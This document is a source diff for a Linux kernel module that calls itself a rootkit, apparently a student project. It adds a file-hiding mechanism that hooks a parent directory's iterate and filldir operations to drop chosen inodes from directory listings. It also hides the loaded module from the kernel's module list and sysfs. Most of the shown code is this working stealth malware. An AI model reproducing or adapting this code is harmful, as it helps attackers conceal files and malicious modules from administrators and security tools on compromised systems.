@@ -5,6 +5,10 @@
 #include <linux/namei.h>
 #include <linux/path.h>
 #include <linux/mount.h>
+#include <linux/slab.h>
+#include <linux/kobject.h>
+#include <linux/delay.h>
+
 #include <asm/uaccess.h>
 
 #include "rootkit.h"
@@ -144,9 +148,9 @@ struct file_operations fops ={
 			      , .open = device_open
 			      , .release = device_release				     
 };
-/**************************HIDE FILE*************************************************/
+/**************************HIDE FILE(OBSOLETE)***************************************/
 
-
+/*
 struct dentry* g_parent_dentry;
 struct path g_root_path;
 int g_inode_count = 0;
@@ -156,165 +160,287 @@ void** g_old_parent_inode_pointer;
 void** g_old_parent_fop_pointer;
 
 filldir_t real_filldir; 
+*/
 
 
+/* static void allocate_memory(void) */
+/* { */
+/*   //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
+/*   // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
+/*   // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
 
-void allocate_memory()
-{
-        //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
-        // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
-        // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
-
-        g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
-        g_old_parent_fops_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
+/*   g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
+/*   g_old_parent_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
            
-        g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL);
+/*   g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL); */
 
-}
-void reallocate_memmory()
-{
-	/*Realloc memmory for inode number*/
-	g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL);
+/* } */
+/* static void reallocate_memmory(void) */
+/* { */
+/*   /\*Realloc memmory for inode number*\/ */
+/*   g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL); */
 	
-	// /*Realloc memmory for old pointers*/
-	// g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
-	// g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
-	// g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
+/*   // /\*Realloc memmory for old pointers*\/ */
+/*   // g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
+/*   // g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
+/*   // g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
 
-  	g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
-  	g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
-}
+/*   g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
+/*   g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
+/* } */
 
-
+/*
 static int new_filldir (void *buf,
 			const char *name,
 			int namelen,
 			loff_t offset,
 			u64 ux64,
 			unsigned ino){
-
   unsigned int i = 0;
-  struct dentry* = p_dentry;
+  struct dentry* p_dentry;
   struct qstr current_name;
   current_name.name = name;
   current_name.len = namelen;
-  current_name.hash = full_name_hash (name, namelen);
+  current_name.hash = full_name_hash (NULL,name, namelen);
 
   p_dentry = d_lookup(g_parent_dentry, &current_name);
 
   if (p_dentry!=NULL){
     for(i = 0; i<= g_inode_count - 1; i++){
       if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
-	      return 0;
+	return 0;
     }
   }
 }
 static int new_parent_readdir(struct file* file,
 			      void* dirent,
 			      filldir_t filldir){
-  g_parent_dentry = file->f_dentry;
+  g_parent_dentry = file->f_path.dentry;
   real_filldir = filldir;
-  return  ;
+  return  0;
 }
 
+*/
+
+/*
 static struct file_operations new_parent_fops =
-{
-  .owner=THIS_MODULE,
-  .readdir=new_parent_readdir,
+  {
+   .owner=THIS_MODULE,
+   .readdir=new_parent_readdir,
+  };
+*/
+/******************************OBSOLETE********************************/
+
+
+
+
+/* unsigned long hook_functions(const char* file_path){ */
+/*   int error = 0; */
+/*   struct path path; */
+
+/*   error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path); */
+/*   if(error){ */
+/*     printk( KERN_ALERT "Can't access root\n"); */
+/*     return -1; */
+/*   } */
+  
+/*   error = kern_path("/root", LOOKUP_FOLLOW, &path); */
+/*   if(error){ */
+/*     printk( KERN_ALERT "Can't access file\n"); */
+/*     return -1; */
+/*   } */
+/*   if (g_inode_count==0) */
+/*     { */
+/*       allocate_memory(); */
+/*     } */
+
+/*   if (g_inode_numbers==NULL) */
+/*     { */
+/*       printk( KERN_ALERT "Not enough memmory in buffer\n"); */
+/*       return -1; */
+/*     } */
+
+/*   /\*Save pointers*\/ */
+/*   g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode; */
+/*   g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop; */
+
+/*   /\*Save inode number*\/ */
+/*   g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino; */
+/*   g_inode_count=g_inode_count+1; */
+
+/*   reallocate_memmory(); */
+/*   /\*filldir hook*\/ */
+/*   path.dentry->d_parent->d_inode->i_fop=&new_parent_fops; */
+
+/*   // /\* Hook of commands for file*\/ */
+/*   // path.dentry->d_inode->i_op=&new_iop; */
+/*   // path.dentry->d_inode->i_fop=&new_fop; */
+/* } */
+/* /\*unsigned long backup_functions(void){ */
+/*   int i = 0; */
+/*   struct inode* p_inode; */
+/*   struct inode* p_parent_inode; */
+
+/*   for (i = 0; i< g_inode_count; i++){ */
+/*   p_inode = g_old_inode_pointer[(g_inode_count-1)-i]; */
+
+
+/*   p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i]; */
+/*   p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i]; */
+/*   } */
+/*   return 0 */
+/*   }*\/ */
+
+/**********************NEW HIDE FILE************************************/
+
+// Runtime var
+struct dentry* g_parent_dentry;
+filldir_t original_filldir;
+
+struct path* g_root_path;
+
+// List
+struct inode_to_hide {
+  unsigned long inode_number;
+  void* parent_inode_pointer;
+  void* old_parent_fop; 
+  struct list_head list;
 };
 
-unsigned long hook_functions(const char* file_path){
+LIST_HEAD(inode_to_hide_list);
+
+static int new_parent_filldir(struct dir_context* context,
+			      const char* name,
+			      int namelen,
+			    loff_t offset,
+			    u64 ino,
+			    unsigned int d_type){
+
+  struct dentry* p_dentry;
+  struct qstr current_name;
+  struct inode_to_hide* p;
+  current_name.name = name;
+  current_name.len = namelen;
+  current_name.hash = full_name_hash (NULL, name, namelen);
+  p_dentry = d_lookup(g_parent_dentry, &current_name);
+
+  /* if (p_dentry!=NULL){ */
+  /*   for(i = 0; i<= g_inode_count - 1; i++){ */
+  /*     if (g_inode_numbers[i] == p_dentry->d_inode->i_ino) */
+  /* 	return 0; */
+  /*   } */
+  /* } */
+
+  // Search in list
+  if(p_dentry != NULL){
+    list_for_each_entry(p, &inode_to_hide_list, list){
+      if(p -> inode_number == p_dentry->d_inode-> i_ino )
+	return 0;
+    }
+
+  }
+  // Return original if not in file list
+  return original_filldir(context, name, namelen, offset, ino, d_type);
+}
+
+static int new_parent_iterate(struct file *file, struct dir_context *context){
+  int ret;
+  original_filldir = context->actor;
+  g_parent_dentry = file->f_path.dentry; 
+  *((filldir_t*)&context->actor) = new_parent_filldir;
+  //int ret = g_root_path->dentry->d_inode->i_fop->iterate(file, context);
+  ret = g_parent_dentry->d_inode->i_fop->iterate(file, context);
+  return ret;
+}
+
+static struct file_operations new_parent_fops = {
+						.iterate = new_parent_iterate,
+};
+	  
+
+static int hide_file_hook (const char* file_path){
   int error = 0;
   struct path path;
+  struct inode_to_hide* inode_entry;
+  /* error = kern_path("/root", LOOKUP_FOLLOW, g_root_path); */
+  /* if(error){ */
+  /*   printk( KERN_ALERT "Can't access root\n"); */
+  /*   return -1 */
+  /* } */
 
-  error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path);
-  if(error){
-    printk( KERN_ALERT "Can't access root\n");
-		return -1;
-  }
-  
-  error = kern_path("/root", LOOKUP_FOLLOW, &path);
-  if(error){
+  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
+  if (error){
     printk( KERN_ALERT "Can't access file\n");
-		return -1;
+    return -1;
   }
-  if (g_inode_count==0)
-	{
-		allocate_memory();
-	}
+  // Save inode
+  inode_entry = kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL);
+  if(!inode_entry)
+    return -1;
+  
+  inode_entry->inode_number = path.dentry->d_inode->i_ino;
+  inode_entry->old_parent_fop = path.dentry->d_parent->d_inode->i_fop;
+  inode_entry->parent_inode_pointer = path.dentry->d_parent->d_inode;
 
-	if (g_inode_numbers==NULL)
-	{
-		printk( KERN_ALERT "Not enough memmory in buffer\n");
-	  return -1;
-	}
-
-  /*Save pointers*/
-  g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode;
-        g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop;
-
-	/*Save inode number*/
-	g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino;
-	g_inode_count=g_inode_count+1;
-
-	reallocate_memmory();
-  /*filldir hook*/
-	path.dentry->d_parent->d_inode->i_fop=&new_parent_fops;
-
-	// /* Hook of commands for file*/
-	// path.dentry->d_inode->i_op=&new_iop;
-	// path.dentry->d_inode->i_fop=&new_fop;
+  list_add(&inode_entry->list, &inode_to_hide_list);
+  
+  // Hooking fop of parent
+  path.dentry->d_parent->d_inode->i_fop = &new_parent_fops;
+  return SUCCESS;
 }
-unsigned long backup_functions(){
-  int i = 0;
+
+static int backup_hooks (void){
+  struct inode_to_hide  *p, *tmp;
   struct inode* p_inode;
-  struct inode* p_parent_inode;
-
-  for (i = 0; i< g_inode_count; i++){
-    p_inode = g_old_inode_pointer[(g_inode_count-1)-i];
-
-
-    p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i];
-		p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i];
+  list_for_each_entry(p, &inode_to_hide_list, list){
+    p_inode = p->parent_inode_pointer;
+    p_inode->i_fop = p->old_parent_fop;
   }
-
+  msleep(10);
+  list_for_each_entry_safe(p, tmp, &inode_to_hide_list, list ){
+    list_del(&p->list);
+    kfree(p);
+  }
+  return SUCCESS;
 }
 
-static char* path_name = "/home/dalo2903/test.c";
+static char* test_path_name = "/home/dalo2903/test.c";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
 {
-  hook_functions(path_name)
-  struct inode *inode;
-  struct path path;
-  hook
-  return 0;
-  /*
-    int ret_val;
-    ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
-    if (ret_val < 0) {
-    printk(KERN_ALERT "%s failed with %d\n",
-    "Sorry, registering the character device ", ret_val);
-    return ret_val;
-    }
+  int ret_val;
 
-    printk(KERN_INFO "%s The major device number is %d.\n",
-    "Registeration is a success", MAJOR_NUM);
-    printk(KERN_INFO "If you want to talk to the device driver,\n");
-    printk(KERN_INFO "you'll have to create a device file. \n");
-    printk(KERN_INFO "We suggest you use:\n");
-    printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
-    sprintf(msg, "Starting text\n");*/
+  ret_val = hide_file_hook(test_path_name);
+  if (ret_val < 0){
+    printk(KERN_ALERT "Hook failed ");
+    return ret_val;
+  }
+  /*Hide the module*/
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+ 
+  ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
+  if (ret_val < 0) {
+    printk(KERN_ALERT "%s failed with %d\n",
+	   "Sorry, registering the character device ", ret_val);
+    return ret_val;
+  }
+
+  printk(KERN_INFO "%s The major device number is %d.\n",
+	 "Registeration is a success", MAJOR_NUM);
+  printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
+  sprintf(msg, "Starting text\n");
   return 0;
 }
 
 static void __exit rootkit_exit(void)
-{/*
-   unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
+{
+  backup_hooks();
+  unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
   
-   printk(KERN_INFO "Rootkit unloaded\n");
- */
+  printk(KERN_INFO "Rootkit unloaded\n");
+ 
   return;
 }
 
